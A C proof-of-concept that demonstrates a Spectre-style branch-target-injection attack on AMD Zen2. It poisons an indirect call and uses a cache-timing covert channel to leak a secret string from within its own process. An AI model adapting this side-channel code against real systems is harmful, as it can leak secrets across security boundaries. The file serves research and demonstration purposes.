/* This dummy PoC is tested on an AMD Threadripper Zen2
 * and builds on the Spectre v1 PoC written in the
 * Appendix C of the Spectre paper in
 * https://spectreattack.com/spectre.pdf
 */

/* Required for CPU affinity functions */
#define _GNU_SOURCE
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

/* The rdtscp in itself takes about 60 cycles on Zen2 */
#define CACHE_HIT_THRESHOLD 80
/* Covert channel */
#define ELEMENT_PADDING (512)
/* The number of characters in the ASCII space */
#define NUM_ELEMENTS 256
uint8_t covert_channel[NUM_ELEMENTS * ELEMENT_PADDING];

uint64_t *target;

char *secret = "L Lag gaye";

int malicious_target(char *secret) {
  /* A dependant load where the index into the covert channel is dependant on
   * the secret.
   */
  return covert_channel[*secret * ELEMENT_PADDING];
}

int intended_target(char *secret) { return 2; }

int victim(char *addr) {
  int result;
  int junk = 0;

  /* The branch history needs to be cleared be curated, in reality, the
   * attacker would execute the sequence that matches the victim's branch
   * history. On AMD client Zen2, this needs exactly 32 iterations.
   */
  for (int i = 0; i < 32; i++) {
    result += i;
  }
  __asm volatile("callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r"(result)
                 : "r"(*target)
                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
  return result & junk;
}

void flush_covert_channel() {
  for (int i = 0; i < NUM_ELEMENTS; i++)
    _mm_clflush(&covert_channel[i * ELEMENT_PADDING]);
  _mm_mfence();
}

void read_byte_from_channel(char *secret_addr, char secret_value[2],
                            int score[2]) {
  volatile int result;
  int hits[NUM_ELEMENTS];
  char decoy = '$';
  int winner, runner_up;

  for (int i = 0; i < NUM_ELEMENTS; i++) {
    hits[i] = 0;
    covert_channel[i * ELEMENT_PADDING] = 1;
  }

  for (int iter = 0; iter < 1000; iter++) {
    /* Poison the target and execute the victim.
     * Ideally this would be a different target that aliases in the BTB
     * with the target we want to poison.
     */
    *target = (uint64_t)&malicious_target;
    /* Wait for the load to complete */
    _mm_mfence();

    result ^= victim(&decoy);

    /* A defensive mfence */
    _mm_mfence();

    /* We have architecturally called the poisoned target, this is cheating,
     * remove the effects of this from the cache. Ideally one would execute an
     * indirect call that aliases with the indirect call in the BTB
     *
     * PS: AMD calls the BHB as the BTB and the indirect predictor is called
     * Indirect Target Array.
     */
    for (int i = 0; i < NUM_ELEMENTS; i++)
      _mm_clflush(&covert_channel[i * ELEMENT_PADDING]);
    _mm_mfence();

    *target = (uint64_t)&intended_target;
    _mm_mfence();

    /* Flush the target so that the CPU speculates to the malicious target
     * longer */
    _mm_clflush((void *)target);
    _mm_mfence();

    result ^= victim(secret_addr);
    _mm_mfence();

    for (int i = 0; i < NUM_ELEMENTS; i++) {
      uint64_t start, elapsed;
      int mix_i;
      uint8_t *addr;
      /* This trick of mixing the indices to evade stride prediction
       * as mentioned in the example in Appendix C.
       */
      mix_i = ((i * 167) + 13) & 255;
      addr = &covert_channel[mix_i * ELEMENT_PADDING];
      start = __rdtsc();
      result ^= *addr;
      _mm_mfence();
      elapsed = __rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }

    winner = -1, runner_up = -1;
    for (int i = 0; i < NUM_ELEMENTS; i++) {
      if (winner < 0 || hits[i] >= hits[winner]) {
        runner_up = winner;
        winner = i;
      } else if (runner_up < 0 || hits[i] >= hits[runner_up]) {
        runner_up = i;
      }
    }
    if ((hits[winner] >= 2 * hits[runner_up] + 5) ||
        (hits[winner] == 2 && hits[runner_up] == 0)) {
      break;
    }
  }

  hits[0] ^= result;
  secret_value[0] = (char)winner;
  score[0] = hits[winner];
  secret_value[1] = (char)runner_up;
  score[1] = hits[runner_up];
}

// Function to set CPU affinity to a single core (improves accuracy)
void set_cpu_affinity() {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set); // Bind to CPU 0
  sched_setaffinity(0, sizeof(set), &set);
}

int main() {
  set_cpu_affinity(); // Pin execution to CPU 0 for accuracy

  target = (uint64_t *)malloc(sizeof(uint64_t));
  char result[2];
  int score[2];
  int probe_len = strlen(secret);
  char *probe_addr = secret;

  printf("Reading %d bytes starting at %p:\n", probe_len, probe_addr);
  while (--probe_len >= 0) {
    printf("reading %p...", probe_addr);
    read_byte_from_channel(probe_addr++, result, score);
    printf("%s: (hits=%d vs %d)",
           (score[0] > 0 && score[0] >= 2 * score[1] ? "success" : "unclear"),
           score[0], score[1]);
    printf("0x%02X='%c'\n", result[0],
           (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
  }
  printf("\n");
  free(target);
}